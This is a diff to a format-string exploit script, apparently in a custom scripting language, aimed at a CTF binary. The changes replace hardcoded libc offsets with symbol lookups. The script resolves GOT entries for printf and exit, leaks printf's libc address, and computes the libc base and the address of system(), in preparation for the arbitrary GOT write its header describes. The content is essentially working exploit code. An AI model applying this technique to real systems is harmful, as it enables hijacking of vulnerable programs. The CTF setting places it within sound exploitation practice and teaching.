@@ -1,15 +1,15 @@
 # Advanced format string exploitation
 # Leak addresses, calculate base, arbitrary write to GOT
 
-let binary = "./vuln"
-let host = "pwn.chal.ctf"
+let binary = "./format_string_vuln"  # Compile from format_string_vuln.c in examples/
+let host = "pwn.chal.ctf"            # Replace with actual CTF target
 let port = 31337
 
 # Analyze binary
 let elf = analyze(binary)
-let got_printf = elf.got["printf"]
-let got_exit = elf.got["exit"]
-let win_func = elf.symbols["win"]
+let got_printf = elf["got"]["printf"]
+let got_exit = elf["got"]["exit"]
+let win_func = elf["symbols"]["win"]
 
 print("[*] Target GOT entries:")
 print("    printf@GOT:", hex(got_printf))
@@ -40,9 +40,14 @@ let printf_addr = u64(leaked_data)
 
 print("[+] Leaked printf@libc:", hex(printf_addr))
 
-# Calculate libc base
-let libc_base = printf_addr - 0x64f70  # libc offset
-let system = libc_base + 0x50d60
+# Calculate libc base dynamically using Libc object
+let libc_template = Libc("ubuntu20.04")
+let printf_offset = libc_template["symbols"]["printf"]
+let libc_base = printf_addr - printf_offset
+
+# Create resolved Libc object with known base
+let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+let system = libc_resolved["symbols"]["system"]
 print("[+] Libc base:", hex(libc_base))
 print("[+] system():", hex(system))
 
